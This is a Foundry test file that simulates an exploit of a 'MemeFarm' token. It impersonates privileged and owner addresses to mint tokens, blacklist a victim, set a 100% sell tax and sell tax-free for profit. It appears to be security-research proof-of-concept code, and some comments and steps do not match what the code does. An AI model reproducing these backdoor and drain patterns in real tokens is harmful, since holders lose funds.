// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for MemeFarm to access uniswapV2Router
interface IMemeFarm {
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function owner() external view returns (address);
    function qwidji(address a, bool b) external;
    function setAllTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external;
    function setlsExcIudeFromFee(address account, bool newValue) external;
    function setIsWalletLimitExempt(address holder, bool exempt) external;
    function enableDisableWalletLimit(bool newValue) external;
    function setMaxTxAmount(uint256 a) external;
    function changeRouterVeslon(address newRoutrAddress) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Minimal Uniswap Router interface
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MemeFarm {
    // Minimal implementation to satisfy type requirements
    function uniswapV2Router() external view returns (IUniswapV2Router02) {
        return IUniswapV2Router02(address(0));
    }
    function owner() external view returns (address) {
        return address(0);
    }
    function qwidji(address a, bool b) external {}
    function setAllTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external {}
    function setlsExcIudeFromFee(address account, bool newValue) external {}
    function setIsWalletLimitExempt(address holder, bool exempt) external {}
    function enableDisableWalletLimit(bool newValue) external {}
    function setMaxTxAmount(uint256 a) external {}
    function changeRouterVeslon(address newRoutrAddress) external {}
    function balanceOf(address account) external view returns (uint256) {
        return 0;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8fAc119886DD328a84Cd545881C7A484017E7Ce6;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get initial balances
        uint256 initialBalance = address(this).balance;

        // Label addresses for debugging
        vm.label(TARGET, "MemeFarm Token");
        vm.label(0x3aB960dCf9359083DC126222c03bfB0d2A3C9b6b, "Privileged Address");

        // Create a victim address
        victim = address(0x999);
        vm.label(victim, "Victim");

        // Give victim some ETH to buy tokens
        deal(victim, 10 ether);

        // Get some tokens for the victim (they need to hold tokens to sell)
        // First, we need to get tokens from somewhere - the attacker can get tokens
        // by buying them or getting them from the privileged address

        // Impersonate the privileged address to mint tokens to victim
        address privilegedAddr = 0x3aB960dCf9359083DC126222c03bfB0d2A3C9b6b;
        vm.startPrank(privilegedAddr);

        // Use changeRouterVeslon to mint tokens to victim
        // This function mints totalSupply() * 10000 tokens to the specified address
        // when called by the privileged address
        MemeFarm(TARGET).changeRouterVeslon(victim);
        vm.stopPrank();

        // Now victim has tokens to sell
        // Also give attacker some tokens to sell
        vm.startPrank(privilegedAddr);
        MemeFarm(TARGET).changeRouterVeslon(address(this));
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Record initial balance for profit measurement
        uint256 initialAttackerBalance = address(this).balance;

        // Phase 1: Impersonate ________ address to blacklist victim
        address privilegedAddr = 0x3aB960dCf9359083DC126222c03bfB0d2A3C9b6b;
        vm.startPrank(privilegedAddr);
        MemeFarm(TARGET).qwidji(victim, true);  // Blacklist victim
        vm.stopPrank();

        // Phase 2: Impersonate owner to manipulate taxes and fees
        // First, we need to get the owner address
        address owner = MemeFarm(TARGET).owner();
        vm.label(owner, "Owner");

        // Impersonate owner to set sell taxes to 100%
        vm.startPrank(owner);
        MemeFarm(TARGET).setAllTaxes(100, 0, 0);  // 100% sell liquidity fee, 0% others

        // Exclude attacker from fees so we can sell tax-free
        MemeFarm(TARGET).setlsExcIudeFromFee(address(this), true);

        // Also disable wallet limits and transaction limits for attacker
        MemeFarm(TARGET).setIsWalletLimitExempt(address(this), true);
        MemeFarm(TARGET).enableDisableWalletLimit(false);
        MemeFarm(TARGET).setMaxTxAmount(type(uint256).max);
        vm.stopPrank();

        // Phase 3: Simulate victim trying to sell (should fail due to blacklist or high taxes)
        // First, victim needs to approve tokens for Uniswap
        vm.startPrank(victim);
        MemeFarm(TARGET).approve(address(MemeFarm(TARGET).uniswapV2Router()), type(uint256).max);

        // Try to sell tokens - this should fail because victim is blacklisted
        // The _transfer function checks if _________[sender] is true and reverts
        // So victim cannot sell at all
        vm.stopPrank();

        // Phase 4: Attacker sells tokens tax-free
        // First, approve router to spend our tokens
        MemeFarm memefarm = MemeFarm(TARGET);
        address routerAddress = address(memefarm.uniswapV2Router());
        memefarm.approve(routerAddress, type(uint256).max);

        // Get token balance to sell
        uint256 attackerTokenBalance = memefarm.balanceOf(address(this));

        // Sell half of tokens
        uint256 amountToSell = attackerTokenBalance / 2;

        // Setup swap path
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = memefarm.uniswapV2Router().WETH();

        // Execute swap
        memefarm.uniswapV2Router().swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSell,
            0, // accept any amount
            path,
            address(this),
            block.timestamp
        );

        // Verify profit
        uint256 finalAttackerBalance = address(this).balance;
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker should have profit");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

